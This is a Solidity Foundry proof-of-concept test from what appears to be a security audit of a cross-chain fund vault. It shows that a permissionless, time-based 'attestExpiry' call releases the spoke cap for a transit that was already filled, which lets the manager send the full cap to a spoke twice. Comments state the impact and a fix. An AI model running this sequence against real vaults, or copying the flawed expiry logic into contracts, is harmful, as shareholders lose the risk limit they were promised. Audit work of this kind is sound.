// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {TransitState} from "../../../src/interfaces/FundTypes.sol";
import {ReportCodec} from "../../../src/libraries/ReportCodec.sol";
import {CoreVaultFixture} from "../../unit/core/CoreVaultFixture.sol";

/// @title PoC: the Spoke Cap is released by a time-based "expiry" of a transit that was filled, so the manager sends
///        the cap to the spoke twice
/// @notice ATTACK. The Spoke Cap is the Mandate's only bound on how much fund principal one spoke may hold (DEC-031,
///         DEC-037, DEC-095) and is checked on send as `spokeValue + inFlightSent + inFlightToHub + amount <= cap`
///         (CoreVaultLogic.sol:664-667). `spokeValue` comes from the LAST ACCEPTED report and `inFlightSent` is
///         released by `attestExpiry` (CoreVaultLogic.sol:722). `attestExpiry` is permissionless and needs no report
///         at all once `fillDeadline + maxReportAge` has passed (`nonArrivalProvable`, CoreVaultLogic.sol:548-550):
///         the deadline-plus-lifetime path "proves" non-arrival of a transit that Across filled hours earlier. So the
///         manager sends the whole cap, has it filled, lets no report be accepted for 6 h 27 min (it runs the fund's
///         keeper, or it is the only party that bothers; `report()` and `deliver` are permissionless but nobody is
///         obliged to call them), attests the expiry of its own transit and sends the whole cap again. The next
///         report then confirms both arrivals and values the spoke at twice its cap; Share Assets stay exact, only
///         the limit is gone. An honest fund gets the same result from a 6.5 h report outage: a stranger attests,
///         the manager believes the send failed and sends again.
/// @notice IMPACT. The risk limit the Mandate promises to shareholders (how much of the fund may sit on a spoke,
///         where the hub cannot unwind it and every value depends on a report) is bypassable by the manager at will,
///         to any multiple: a fund with a 10% Robinhood cap can be moved to Robinhood in full. No value is lost by
///         the bypass itself; the loss is that DEC-037's "cap = spoke value + in-flight" no longer bounds anything.
/// @notice FIX. Do not treat "deadline + report lifetime" alone as proof of non-arrival for the purpose of the cap:
///         keep `inFlightSent` counted until the transit is confirmed OR its refund is recognized (a real refund
///         proves non-arrival; DEC-066's "attested expiry" can keep releasing In-flight Value from Share Assets
///         only after the refund). Alternatively require, for the time-based path, a report whose
///         `cumulativeReceived` proves the spoke never credited the amount.
/// @dev Real Core Vault and CoreVaultLogic on the repository's unit fixture; reports come from the mock receiver
///      exactly as a Spoke Vault would publish them. SPOKE_CAP is 100,000 USDC.
contract SpokeCapBypassPoC is CoreVaultFixture {
    function test_POC_attestedExpiryOfAFilledTransitLetsTheManagerSendTheCapTwice() public {
        _deposit(alice, 300_000e6);
        uint256 assetsBefore = vault.shareAssets();

        // The manager fills the cap in one send. The cap holds: one more USDC is refused.
        bytes32 first = _send(SPOKE_CAP, SPOKE_CAP);
        vm.prank(manager);
        vm.expectRevert(abi.encodeWithSelector(ICoreVault.SpokeCapExceeded.selector, 0, SPOKE_CAP, 1e6, SPOKE_CAP));
        vault.sendToSpoke(0, 1e6, 0, _quote(1e6));

        // Across fills the deposit on Robinhood within the hour (the spoke credits it; the hub only learns it from a
        // report). No report is accepted on the hub for the next 6 h 27 min.
        vm.warp(block.timestamp + 6 hours + MAX_REPORT_AGE + 1);

        // Anyone "attests" the expiry of a transit that arrived: the time path needs no evidence. The Spoke Cap is
        // released, Share Assets still count the amount (QB11 stance).
        vault.attestExpiry(first);
        assertEq(uint8(vault.transit(first).state), uint8(TransitState.ExpiryAttested));
        (uint256 spokeValue, uint256 inFlightSent,,) = vault.spokeCapUsage(0);
        assertEq(spokeValue + inFlightSent, 0, "the cap reads empty while 100,000 USDC sit on the spoke");
        assertEq(vault.shareAssets(), assetsBefore, "nothing was lost, the transit is still In-flight Value");

        // The manager sends the whole cap again.
        bytes32 second = _send(SPOKE_CAP, SPOKE_CAP);
        assertEq(vault.idle(), assetsBefore - 2 * SPOKE_CAP);

        // The spoke's next report lists both arrivals. Both are confirmed and the spoke is valued at twice its cap.
        ReportCodec.Report memory r = _spokeReport(2 * SPOKE_CAP, 2 * SPOKE_CAP);
        r.arrivedTransits = new ReportCodec.TransitAmount[](2);
        r.arrivedTransits[0] = ReportCodec.TransitAmount(first, SPOKE_CAP);
        r.arrivedTransits[1] = ReportCodec.TransitAmount(second, SPOKE_CAP);
        _deliver(r);
        assertEq(uint8(vault.transit(first).state), uint8(TransitState.ArrivalConfirmed));
        assertEq(uint8(vault.transit(second).state), uint8(TransitState.ArrivalConfirmed));
        uint256 cap;
        (spokeValue, inFlightSent,, cap) = vault.spokeCapUsage(0);
        assertEq(spokeValue, 2 * SPOKE_CAP, "200,000 USDC of principal on a spoke capped at 100,000");
        assertEq(inFlightSent, 0);
        assertEq(cap, SPOKE_CAP);
        assertEq(vault.shareAssets(), assetsBefore, "Share Assets are exact: only the Mandate's limit is gone");
        assertEq(vault.inFlightValue(), 0);
    }
}
